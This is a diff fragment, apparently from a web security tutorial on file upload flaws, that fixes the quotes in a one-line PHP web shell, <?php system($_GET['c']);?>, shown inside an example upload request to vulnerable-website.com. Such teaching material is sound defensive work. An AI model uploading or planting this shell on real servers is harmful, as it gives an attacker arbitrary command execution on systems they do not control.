@@ -273,7 +273,7 @@ Host: vulnerable-website.com
 Content-Type: application/x-httpd-php
 Content-Length: 49
 
-<?php system($_GET[‘c’]);?>
+<?php system($_GET['c']);?>
 ```
 {% endcode %}
 
